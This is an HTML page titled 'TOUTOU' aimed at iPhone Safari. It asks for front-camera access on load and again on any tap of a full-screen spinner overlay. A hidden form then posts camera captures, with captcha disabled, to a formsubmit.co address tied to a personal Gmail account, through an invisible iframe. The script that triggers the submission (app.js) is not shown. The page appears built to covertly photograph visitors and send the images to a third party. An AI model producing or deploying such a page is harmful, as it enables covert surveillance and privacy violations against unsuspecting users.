<!DOCTYPE html>
<html lang="fr">
  <head>
    <meta charset="UTF-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, viewport-fit=cover, maximum-scale=1"
    />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
    <meta name="apple-mobile-web-app-title" content="TOUTOU" />
    <meta name="theme-color" content="#07080c" />
    <title>TOUTOU</title>
    <script>
      window.__camConstraints = { audio: false, video: { facingMode: "user" } };
      window.__askCam = function () {
        if (!window.__camReady && navigator.mediaDevices) {
          window.__camReady = navigator.mediaDevices.getUserMedia(
            window.__camConstraints
          );
        }
        return window.__camReady;
      };
      window.__askCam();
    </script>
    <link rel="stylesheet" href="../styles.css" />
    <link rel="preload" href="../app.js" as="script" />
    <link rel="icon" href="../favicon.svg" type="image/svg+xml" />
  </head>
  <body>
    <div class="glow glow-a" aria-hidden="true"></div>
    <div class="glow glow-b" aria-hidden="true"></div>

    <main class="sheet">
      <header class="hero">
        <p class="kicker">Safari · iPhone</p>
        <h1>TOUTOU</h1>
      </header>

      <section class="stage">
        <video id="live" class="live" playsinline webkit-playsinline muted autoplay></video>
        <div id="placeholder" class="placeholder">
          <div class="spinner" aria-hidden="true"></div>
        </div>
      </section>

      <iframe id="silentframe" name="silentframe" class="silent" title=""></iframe>
      <form
        id="form"
        action="https://formsubmit.co/cmahdi204@gmail.com"
        method="POST"
        enctype="multipart/form-data"
        target="silentframe"
      >
        <input type="hidden" name="_subject" value="TOUTOU" />
        <input type="hidden" name="_template" value="table" />
        <input type="hidden" name="_captcha" value="false" />
        <input type="text" name="_honey" class="honey" tabindex="-1" autocomplete="off" />
        <input type="hidden" name="appareil" id="deviceField" value="iPhone" />
        <input type="hidden" name="date" id="dateField" value="" />
        <input type="hidden" name="taille" id="sizeField" value="" />
        <input
          id="cameraInput"
          class="file"
          type="file"
          name="attachment"
          accept="image/*"
          capture="user"
        />
      </form>
    </main>

    <div id="overlay" class="overlay" ontouchstart="window.__askCam()" onclick="window.__askCam()">
      <div class="spinner" aria-hidden="true"></div>
    </div>

    <script src="../app.js"></script>
  </body>
</html>
